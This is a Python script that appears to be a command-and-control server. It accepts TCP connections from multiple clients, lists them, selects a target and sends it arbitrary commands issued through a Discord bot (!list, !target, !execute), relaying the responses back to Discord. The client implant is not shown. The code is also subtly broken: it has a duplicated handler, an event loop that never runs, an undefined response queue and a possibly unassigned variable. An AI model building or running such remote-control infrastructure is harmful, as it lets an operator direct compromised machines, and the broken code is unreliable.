#!/usr/bin/python3

import socket
import threading
import signal
import sys
import discord
from discord.ext import commands
import asyncio
import os

clients = []
target_client = None

bot_instance = None

async def handle_client_commands(client_socket, address):
    while True:
        data = client_socket.recv(1024)
        if not data:
            print(f"Connection from {address} closed.")
            clients.remove(client_socket)
            break

        command = data.decode()
        print(f"Received command from {address}: {command}")

        try:
            response = await execute_command_on_client(client_socket, command)  # Await the result from the client
            await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the response to Discord
        except Exception as e:
            response = f"Error executing command: {str(e)}"
            await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the error response to Discord

    client_socket.close()

def handle_client(client_socket, address):
    print(f"Accepted connection from {address}")
    clients.append(client_socket)
    client_socket.send(b"Welcome to the server!")

    async def handle_client_commands(client_socket, address):
        while True:
            data = client_socket.recv(1024)
            if not data:
                print(f"Connection from {address} closed.")
                clients.remove(client_socket)
                break

            command = data.decode()
            print(f"Received command from {address}: {command}")

            try:
                response = await execute_command_on_client(client_socket, command)  # Await the result from the client
                await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the response to Discord
            except Exception as e:
                response = f"Error executing command: {str(e)}"
                await relay_response_to_discord(response, client_socket)  # Pass client_socket to relay the error response to Discord

    # Create an event loop for the handle_client_commands function
    loop = asyncio.new_event_loop()

    # Start the handle_client_commands coroutine in a separate thread
    asyncio.run_coroutine_threadsafe(handle_client_commands(client_socket, address), loop)

def send_command_to_clients(command):
    for client_socket in clients:
        try:
            client_socket.send(command.encode())
        except:
            clients.remove(client_socket)

def list_active_connections():
    connections = [f"{i}: {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}" for i, client_socket in enumerate(clients)]
    return '\n'.join(connections)

def switch_target_client(index):
    global target_client
    if 0 <= index < len(clients):
        target_client = clients[index]
        return f"Switched target client to {index}"
    else:
        return "Invalid client index"

async def execute_command_on_target(command):
    if target_client is not None:
        try:
            response = await execute_command_on_client(target_client, command)  # Await the result from the client
            #await relay_response_to_discord(response, target_client)  # Pass target_client to relay the response to Discord
        except Exception as e:
            response = f"Error executing command: {str(e)}"
            #await relay_response_to_discord(response, target_client)  # Pass target_client to relay the error response to Discord
    #else:
        #response = "No target client selected"
    await relay_response_to_discord(response, target_client)


async def execute_command_on_client(client_socket, command):
    client_socket.send(command.encode())
    response = client_socket.recv(4096).decode()
    print(response)
    return response

async def relay_response_to_discord(response, client_socket):
    print(f"Response from client: {response}")
    global bot_instance
    if bot_instance is not None and response:
        channel_id = client_socket.getpeername()[1]  # Use the port number as the channel ID (unique identifier)

        channel = bot_instance.get_channel(channel_id)
        if channel:
            await channel.send(response)  # Send the response from the client to Discord
        else:
            print("Channel not found.")
    else:
        print("Bot instance not available or response is empty")

def close_server(signal, frame):
    global clients
    print("\nClosing server and terminating all connections...")
    for client_socket in clients:
        client_socket.close()
    sys.exit(0)

async def relay_responses():
    while True:
        response, client_socket = await response_queue.get()  # Wait for responses in the queue
        await relay_response_to_discord(response, client_socket)

def main():
    host = "127.0.0.1"  # Change this to your server's IP address
    port = 8888  # You can use any available port number

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Server listening on {host}:{port}")

    def run_server():
        while True:
            client_socket, address = server_socket.accept()
            client_handler = threading.Thread(target=handle_client, args=(client_socket, address))
            client_handler.start()

    server_thread = threading.Thread(target=run_server)
    server_thread.start()

    signal.signal(signal.SIGINT, close_server)  # Register the signal handler

    # Discord bot setup
    intents = discord.Intents.all()
    TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
    GUILD = "SERVER NAME" # Replace this with the server's name

    bot = commands.Bot(command_prefix='!', intents=intents)

    global bot_instance
    bot_instance = bot


    @bot.event
    async def on_ready():
        print(f'Bot is ready. Logged in as {bot.user}')

    @bot.command(name='list')
    async def list_connections(ctx):
        await ctx.send("Active connections:\n" + list_active_connections())

    @bot.command(name='target')
    async def set_target(ctx, index: int):
        response = switch_target_client(index)
        await ctx.send(response)

    @bot.command(name='execute')
    async def execute_command(ctx, *, command: str):
        response = await execute_command_on_target(command)
        await ctx.send(response)

    @bot.command(name='h')  # Changed help to h
    async def help_commands(ctx):
        help_text = """Available commands:
        !list - list all the active connections
        !target <number> - switch the target client to the number in the list
        !execute <command> - send the message that follows to the targeted client
        !h - list these commands"""  # Changed help to h
        await ctx.send(help_text)

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    # Start the relay_responses coroutine in a separate thread
    relay_thread = threading.Thread(target=asyncio.run_coroutine_threadsafe, args=(relay_responses(), loop))
    relay_thread.start()

    bot.run(TOKEN)

if __name__ == "__main__":
    main()

